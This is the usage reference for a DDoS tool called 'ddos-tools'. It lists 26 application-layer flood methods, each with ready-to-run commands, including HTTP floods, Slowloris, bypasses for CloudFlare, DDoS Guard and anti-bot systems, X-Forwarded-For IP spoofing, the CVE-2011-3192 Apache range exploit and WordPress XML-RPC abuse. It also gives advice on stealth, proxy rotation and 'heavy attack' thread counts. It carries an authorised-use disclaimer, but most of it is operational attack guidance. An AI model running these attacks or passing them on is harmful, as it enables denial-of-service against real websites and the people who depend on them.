# Layer 7 Attack Methods - Quick Reference Guide

**Maintained By**: Muhammad Thariq  
**Last Updated**: November 2025  
**Version**: 2.4 SNAPSHOT

---

## Overview

This document provides a comprehensive reference for all 26 Layer 7 (Application Layer) attack methods implemented in ddos-tools. All methods are **100% implemented and ready to use**.

## Table of Contents

- [Basic HTTP Methods](#basic-http-methods)
- [Bypass & Protection Evasion](#bypass--protection-evasion)
- [Advanced Attack Techniques](#advanced-attack-techniques)
- [Method Comparison Table](#method-comparison-table)
- [Usage Examples](#usage-examples)
- [Best Practices](#best-practices)

---

## Basic HTTP Methods

### 1. GET - HTTP GET Flood

**Description**: Standard HTTP GET request flooding attack.

**Syntax**:
```bash
./ddos-tools GET <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
```

**Characteristics**:
- **Speed**: Fast
- **Complexity**: Low
- **Bandwidth**: Medium
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Basic HTTP stress testing
- Resource consumption testing
- Rate limiting validation

---

### 2. POST - HTTP POST Flood

**Description**: HTTP POST request flood with random data payloads.

**Syntax**:
```bash
./ddos-tools POST <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools POST https://example.com/api 5 200 proxies.txt 50 120
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Low
- **Bandwidth**: High
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Form submission testing
- API endpoint stress testing
- Upload handler validation
- POST data processing limits

---

### 3. HEAD - HTTP HEAD Flood

**Description**: HTTP HEAD request flood (no body, lightweight).

**Syntax**:
```bash
./ddos-tools HEAD <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools HEAD http://example.com 5 150 proxies.txt 200 60
```

**Characteristics**:
- **Speed**: Very Fast
- **Complexity**: Low
- **Bandwidth**: Low
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Lightweight flooding without bandwidth usage
- Testing rate limits
- Connection pool exhaustion

---

### 4. STRESS - Mixed Stress Test

**Description**: Combined GET/POST flood with large payloads for maximum stress.

**Syntax**:
```bash
./ddos-tools STRESS <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools STRESS http://example.com 5 100 proxies.txt 100 90
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Medium
- **Bandwidth**: High
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Comprehensive stress testing
- Resource exhaustion
- Multi-vector testing

---

### 5. SLOW - Slowloris Attack

**Description**: Keep-alive connection exhaustion attack (Slowloris).

**Syntax**:
```bash
./ddos-tools SLOW <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools SLOW http://example.com 5 200 proxies.txt 50 300
```

**Characteristics**:
- **Speed**: Slow
- **Complexity**: Medium
- **Bandwidth**: Low
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Connection pool exhaustion
- Timeout configuration testing
- Keep-alive abuse testing

---

### 6. NULL - HTTP NULL Flood

**Description**: Minimal headers HTTP flood for maximum speed.

**Syntax**:
```bash
./ddos-tools NULL <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools NULL http://example.com 5 300 proxies.txt 500 60
```

**Characteristics**:
- **Speed**: Very Fast
- **Complexity**: Low
- **Bandwidth**: Low
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- High-speed flooding with minimal overhead
- Maximum requests per second
- Parser stress testing

---

### 7. COOKIE - Cookie-Based Attack

**Description**: HTTP flood with randomized cookie headers.

**Syntax**:
```bash
./ddos-tools COOKIE <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools COOKIE http://example.com 5 100 proxies.txt 100 60
```

**Characteristics**:
- **Speed**: Fast
- **Complexity**: Low
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Session handling testing
- Cookie parsing vulnerabilities
- Session store exhaustion

---

### 8. PPS - Packets Per Second Optimized

**Description**: Optimized for maximum packets per second delivery.

**Syntax**:
```bash
./ddos-tools PPS <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools PPS http://example.com 5 200 proxies.txt 1000 60
```

**Characteristics**:
- **Speed**: Very Fast
- **Complexity**: Low
- **Bandwidth**: High
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Network saturation testing
- Bandwidth testing
- Throughput measurement

---

## Bypass & Protection Evasion

### 9. CFB - CloudFlare Bypass

**Description**: CloudFlare bypass using cloudscraper-like techniques.

**Syntax**:
```bash
./ddos-tools CFB <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools CFB https://example.com 5 100 proxies.txt 50 120
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: High
- **Bandwidth**: Medium
- **Detection**: Hard
- **Privileges**: None required

**Use Cases**:
- Testing CloudFlare protection
- Bypassing basic WAF rules
- Challenge-response testing

**Notes**: Simplified version without full JavaScript challenge solving.

---

### 10. BYPASS - Generic WAF Bypass

**Description**: Generic bypass method using standard HTTP client.

**Syntax**:
```bash
./ddos-tools BYPASS <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools BYPASS https://example.com 5 100 proxies.txt 100 60
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing generic WAF protection
- Standard bypass techniques
- HTTP client evasion

---

### 11. OVH - OVH-Specific Attack

**Description**: OVH-optimized attack with limited RPC (max 5).

**Syntax**:
```bash
./ddos-tools OVH <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools OVH http://example.com 5 100 proxies.txt 5 60
```

**Characteristics**:
- **Speed**: Slow
- **Complexity**: Medium
- **Bandwidth**: Low
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing OVH DDoS protection
- Limited request attacks
- Provider-specific testing

**Notes**: Automatically limits RPC to maximum of 5 per connection.

---

### 12. DYN - Dynamic Host Header Attack

**Description**: Dynamic host header manipulation with IP spoofing.

**Syntax**:
```bash
./ddos-tools DYN <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools DYN http://example.com 5 150 proxies.txt 100 90
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing virtual host configurations
- Host header validation
- X-Forwarded-For testing

**Features**:
- Random prefix generation
- IP spoofing via X-Forwarded-For
- Dynamic host headers

---

### 13. DGB - DDoS Guard Bypass

**Description**: DDoS Guard bypass with timing delays.

**Syntax**:
```bash
./ddos-tools DGB <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools DGB https://example.com 5 100 proxies.txt 5 120
```

**Characteristics**:
- **Speed**: Slow
- **Complexity**: High
- **Bandwidth**: Low
- **Detection**: Hard
- **Privileges**: None required

**Use Cases**:
- Testing DDoS Guard protection
- Challenge-response bypass
- Rate-limited attacks

**Notes**: Includes timing delays and limited to 5 RPC max.

---

### 14. AVB - Anti-Bot Bypass

**Description**: Anti-bot protection bypass with request delays.

**Syntax**:
```bash
./ddos-tools AVB <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools AVB http://example.com 5 100 proxies.txt 100 60
```

**Characteristics**:
- **Speed**: Slow
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Hard
- **Privileges**: None required

**Use Cases**:
- Testing bot detection
- Rate limiting with delays
- Human-like behavior simulation

**Features**:
- Dynamic delay calculation based on RPC
- Minimum 1ms delay between requests

---

### 15. CFBUAM - CloudFlare Under Attack Mode Bypass

**Description**: CloudFlare UAM bypass with 5-second challenge wait.

**Syntax**:
```bash
./ddos-tools CFBUAM <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools CFBUAM https://example.com 5 50 proxies.txt 100 180
```

**Characteristics**:
- **Speed**: Very Slow
- **Complexity**: High
- **Bandwidth**: Medium
- **Detection**: Very Hard
- **Privileges**: None required

**Use Cases**:
- Testing CloudFlare "I'm Under Attack" mode
- Challenge solving simulation
- Long-duration attacks

**Features**:
- Initial 5.01 second wait for challenge
- Continues for up to 120 seconds
- Connection persistence

---

## Advanced Attack Techniques

### 16. EVEN - Event-Based Attack

**Description**: Sends requests and reads responses to keep connections alive.

**Syntax**:
```bash
./ddos-tools EVEN <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools EVEN http://example.com 5 100 proxies.txt 100 120
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Medium
- **Bandwidth**: High
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Connection persistence testing
- Keep-alive exploitation
- Response processing testing

---

### 17. GSB - Google Search Bot Simulation

**Description**: Simulates Google Search Bot with query strings and special headers.

**Syntax**:
```bash
./ddos-tools GSB <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools GSB http://example.com 5 100 proxies.txt 200 60
```

**Characteristics**:
- **Speed**: Fast
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing bot detection
- Search engine crawler handling
- Query string parameter testing

**Features**:
- Random query string generation
- Sec-Fetch-* headers
- IP spoofing via X-Forwarded-For
- HEAD requests with random paths

---

### 18. APACHE - Apache Range Header Attack

**Description**: Apache Range header vulnerability (CVE-2011-3192) exploitation.

**Syntax**:
```bash
./ddos-tools APACHE <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools APACHE http://example.com 5 50 proxies.txt 10 60
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: High
- **Bandwidth**: High
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Testing Apache range header parsing
- Resource exhaustion
- Memory consumption testing

**Features**:
- Builds range header with 1024 range specifications
- Targets Apache web servers specifically
- CVE-2011-3192 exploitation

⚠️ **Warning**: Only effective against vulnerable Apache versions.

---

### 19. XMLRPC - XML-RPC Pingback Attack

**Description**: WordPress XML-RPC pingback flood.

**Syntax**:
```bash
./ddos-tools XMLRPC <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools XMLRPC https://example.com/xmlrpc.php 5 100 proxies.txt 50 90
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing WordPress XML-RPC protection
- Pingback abuse testing
- XML parser stress testing

**Features**:
- Sends pingback.ping method calls
- Random 64-character strings in parameters
- Content-Type: application/xml
- X-Requested-With: XMLHttpRequest header

---

### 20. BOT - Bot Simulation Attack

**Description**: Simulates search engine bots requesting robots.txt and sitemap.xml.

**Syntax**:
```bash
./ddos-tools BOT <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools BOT http://example.com 5 100 proxies.txt 100 60
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing bot detection
- Crawler rate limiting
- robots.txt/sitemap.xml handling

**Features**:
- Uses real search engine user agents (Googlebot, Bingbot, Yahoo Slurp)
- Requests /robots.txt
- Requests /sitemap.xml
- Includes If-None-Match and If-Modified-Since headers

---

### 21. BOMB - High-Volume Bombardment

**Description**: High-volume attack for maximum request throughput.

**Syntax**:
```bash
./ddos-tools BOMB <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools BOMB http://example.com 5 200 proxies.txt 500 60
```

**Characteristics**:
- **Speed**: Very Fast
- **Complexity**: Low
- **Bandwidth**: Very High
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Bandwidth saturation
- Maximum throughput testing
- Resource exhaustion

**Notes**: Simplified version without external bombardier dependency.

---

### 22. DOWNLOADER - Download and Read Attack

**Description**: Downloads and reads all response data to maximize bandwidth usage.

**Syntax**:
```bash
./ddos-tools DOWNLOADER <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools DOWNLOADER http://example.com/large-file 5 100 proxies.txt 50 120
```

**Characteristics**:
- **Speed**: Slow
- **Complexity**: Low
- **Bandwidth**: Very High
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Bandwidth exhaustion
- Testing large file delivery
- Download endpoint stress testing

**Features**:
- Reads entire response body
- 10ms delay between reads
- Connection termination with "0" byte

---

### 23. KILLER - Multi-Spawn GET Attack

**Description**: Spawns multiple concurrent GET requests using goroutines.

**Syntax**:
```bash
./ddos-tools KILLER <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools KILLER http://example.com 5 50 proxies.txt 100 60
```

**Characteristics**:
- **Speed**: Very Fast
- **Complexity**: High
- **Bandwidth**: Very High
- **Detection**: Easy
- **Privileges**: None required

**Use Cases**:
- Extreme concurrency testing
- Connection pool exhaustion
- Goroutine stress testing

**Features**:
- Spawns RPC number of goroutines
- Each goroutine executes GET method
- Extreme parallelism

⚠️ **Warning**: Use moderate RPC values to avoid spawning excessive goroutines.

---

### 24. TOR - Tor Network Bypass

**Description**: Tor network (.onion) access via tor2web gateways.

**Syntax**:
```bash
./ddos-tools TOR <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools TOR http://example.onion 5 50 proxies.txt 50 90
```

**Characteristics**:
- **Speed**: Slow
- **Complexity**: High
- **Bandwidth**: Low
- **Detection**: Hard
- **Privileges**: None required

**Use Cases**:
- Testing .onion sites
- Tor2web gateway stress testing
- Hidden service testing

**Supported Gateways**:
- onion.city
- onion.cab
- onion.direct
- onion.sh
- onion.link
- onion.ws
- onion.pet
- onion.rip
- onion.plus
- onion.top

**Features**:
- Automatically detects .onion URLs
- Replaces .onion with random tor2web gateway
- Falls back to regular GET for non-.onion URLs

---

### 25. RHEX - Random Hex Path Attack

**Description**: Generates random hex paths for each request.

**Syntax**:
```bash
./ddos-tools RHEX <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools RHEX http://example.com 5 100 proxies.txt 200 60
```

**Characteristics**:
- **Speed**: Fast
- **Complexity**: Medium
- **Bandwidth**: Medium
- **Detection**: Medium
- **Privileges**: None required

**Use Cases**:
- Testing path normalization
- Cache poisoning
- 404 error handling
- Random path generation testing

**Features**:
- Generates random hex strings (32, 64, or 128 bytes)
- Appends to both path and Host header
- Includes Sec-Fetch-* headers for realism

---

### 26. STOMP - Special Hex Pattern Attack

**Description**: Uses special hex patterns targeting CloudFlare CDN endpoints.

**Syntax**:
```bash
./ddos-tools STOMP <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>
```

**Example**:
```bash
./ddos-tools STOMP http://example.com 5 100 proxies.txt 100 90
```

**Characteristics**:
- **Speed**: Medium
- **Complexity**: High
- **Bandwidth**: High
- **Detection**: Hard
- **Privileges**: None required

**Use Cases**:
- Testing CDN protection
- Special character handling
- Path validation
- CloudFlare challenge bypass

**Features**:
- Repeats hex pattern: `\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA` × 23
- Targets /cdn-cgi/l/chk_captcha endpoint
- Includes complete Sec-Fetch-* headers
- IP spoofing via X-Forwarded-For

---

## Method Comparison Table

| Method | Speed | Complexity | Bandwidth | Detection | Target |
|--------|-------|------------|-----------|-----------|--------|
| GET | Fast | Low | Medium | Easy | General |
| POST | Medium | Low | High | Easy | Forms/APIs |
| HEAD | Very Fast | Low | Low | Easy | General |
| STRESS | Medium | Medium | High | Medium | General |
| SLOW | Slow | Medium | Low | Medium | Connections |
| NULL | Very Fast | Low | Low | Easy | General |
| COOKIE | Fast | Low | Medium | Medium | Sessions |
| PPS | Very Fast | Low | High | Easy | Network |
| CFB | Medium | High | Medium | Hard | CloudFlare |
| BYPASS | Medium | Medium | Medium | Medium | WAF |
| OVH | Slow | Medium | Low | Medium | OVH |
| DYN | Medium | Medium | Medium | Medium | Vhosts |
| DGB | Slow | High | Low | Hard | DDoS Guard |
| AVB | Slow | Medium | Medium | Hard | Anti-Bot |
| CFBUAM | Very Slow | High | Medium | Very Hard | CF UAM |
| EVEN | Medium | Medium | High | Medium | Keep-Alive |
| GSB | Fast | Medium | Medium | Medium | Bot Detection |
| APACHE | Medium | High | High | Easy | Apache |
| XMLRPC | Medium | Medium | Medium | Medium | WordPress |
| BOT | Medium | Medium | Medium | Medium | Crawlers |
| BOMB | Very Fast | Low | Very High | Easy | Bandwidth |
| DOWNLOADER | Slow | Low | Very High | Easy | Bandwidth |
| KILLER | Very Fast | High | Very High | Easy | Concurrency |
| TOR | Slow | High | Low | Hard | Tor Sites |
| RHEX | Fast | Medium | Medium | Medium | Paths |
| STOMP | Medium | High | High | Hard | CDN |

---

## Usage Examples

### Basic Attack
```bash
# Simple GET flood with SOCKS5 proxies
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
```

### Bypass Testing
```bash
# CloudFlare bypass attempt
./ddos-tools CFB https://cloudflare-protected.com 5 50 proxies.txt 50 120

# DDoS Guard bypass
./ddos-tools DGB https://ddos-guard-protected.com 5 100 proxies.txt 5 180
```

### High-Volume Attacks
```bash
# Maximum throughput
./ddos-tools BOMB http://example.com 5 200 proxies.txt 500 60

# Multi-spawn attack
./ddos-tools KILLER http://example.com 5 50 proxies.txt 50 60
```

### Specialized Attacks
```bash
# WordPress XML-RPC
./ddos-tools XMLRPC https://wordpress-site.com/xmlrpc.php 5 100 proxies.txt 50 90

# Apache Range header attack
./ddos-tools APACHE http://apache-server.com 5 50 proxies.txt 10 60

# Tor hidden service
./ddos-tools TOR http://example.onion 5 50 proxies.txt 50 90
```

---

## Best Practices

### Method Selection

**For Maximum Speed:**
- NULL, PPS, BOMB, HEAD

**For Stealth:**
- CFB, CFBUAM, DGB, AVB, TOR

**For Specific Targets:**
- APACHE (Apache servers)
- XMLRPC (WordPress sites)
- GSB, BOT (bot detection testing)

**For Connection Exhaustion:**
- SLOW, EVEN, DOWNLOADER

### Parameter Recommendations

**Threads:**
- Light attack: 10-50 threads
- Medium attack: 50-200 threads
- Heavy attack: 200-500 threads

**RPC (Requests Per Connection):**
- Slow methods (SLOW, AVB, DGB): 10-50
- Fast methods (GET, POST, HEAD): 100-500
- Special methods (OVH, DGB): Auto-limited to 5

**Duration:**
- Quick test: 30-60 seconds
- Standard test: 60-300 seconds
- Extended test: 300-600 seconds
- Long-duration (CFBUAM, SLOW): 600+ seconds

### Proxy Usage

**Proxy Types:**
- 0 = Use all proxy types
- 1 = HTTP only
- 4 = SOCKS4 only
- 5 = SOCKS5 only (recommended)
- 6 = Random selection

**Recommendations:**
- Use SOCKS5 for best compatibility
- Ensure proxy list is fresh and valid
- Rotate proxies regularly
- Test proxies before attacks

---

## Legal Notice

⚠️ **IMPORTANT**: All methods must only be used on systems you own or have explicit written authorization to test.

**Authorized Use Only:**
- ✅ Your own infrastructure
- ✅ With written permission
- ✅ In authorized penetration tests
- ✅ For educational purposes in controlled environments

**Prohibited Use:**
- ❌ Unauthorized systems
- ❌ Without proper authorization
- ❌ Malicious intent
- ❌ Causing harm or damage

Violation may result in criminal prosecution under computer fraud laws.

See [LEGAL.md](LEGAL.md) for comprehensive legal guidelines.

---

## Additional Resources

- **[USAGE.md](USAGE.md)** - Complete usage guide with all attack types
 and progress
- **[USER-AGENTS.md](USER-AGENTS.md)** - User agent configuration
- **[CHANGELOG.md](CHANGELOG.md)** - Version history
- **[README.md](../README.md)** - Project overview

---

**Maintained By**: Muhammad Thariq  
**Last Updated**: November 2025  
**Copyright**: © 2025 Muhammad Thariq  
**License**: MIT with Educational Use Terms

**Remember**: Use responsibly and legally. All 26 methods are powerful tools that should only be used for legitimate security testing with proper authorization.